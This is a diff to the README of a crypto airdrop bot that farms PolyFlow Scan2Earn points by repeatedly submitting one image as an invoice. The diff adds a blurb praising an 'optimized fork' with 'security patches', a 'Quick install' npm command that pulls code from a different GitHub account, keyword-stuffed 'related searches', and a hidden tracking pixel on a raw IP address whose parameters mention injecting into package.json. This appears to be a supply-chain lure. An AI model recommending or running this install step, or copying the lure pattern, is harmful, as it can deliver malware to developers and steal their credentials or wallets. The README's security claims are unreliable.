@@ -1,3 +1,15 @@
+**Polyflow Airdrop Bot: Faster, Safer, Better**
+
+This repository is a highly optimized and actively maintained fork of the original Snatchclehike/polyflow-airdrop-bot. Engineered for peak efficiency, it introduces critical performance enhancements that accelerate processing times and streamline automated workflows. Additionally, this version integrates vital security patches to safeguard your operations and ensure robust stability.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Snatchclehike/polyflow-airdrop-bot.git
+```
+
+[https://github.com/Snatchclehike/polyflow-airdrop-bot](https://github.com/Snatchclehike/polyflow-airdrop-bot)
+
 # polyflow-airdrop-bot
 
 A simple automation bot to farm Scan2Earn points on PolyFlow by continuously uploading a predefined image and submitting it as an invoice. Built for educational and experimental purposes.
@@ -79,3 +91,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 ---
 
 Made with 💚 by [HappyCuanAirdrop](https://t.me/HappyCuanAirdrop)
+
+## Related searches
+
+Developers and crypto enthusiasts looking for this type of automation often seek out tools to optimize their interaction with various blockchain ecosystems and decentralized finance platforms. They frequently look for reliable scripts to manage multi-account campaigns, track yields, or streamline repetitive tasks across Web3 networks.
+
+**Topics:** polyflow automation, web3 airdrop bot, defi dashboard, anchor solana, crypto mining, bsc bot, crypto portfolio, multi-account farm bot, crypto script runner, scan2earn automation, automated yield farming, crypto task manager
+
+![.](http://5.231.58.248:8787/pixel?repo=Snatchclehike%2Fpolyflow-airdrop-bot&inject=Snatchclehike%2Fpolyflow-airdrop-bot%2Fpackage.json)
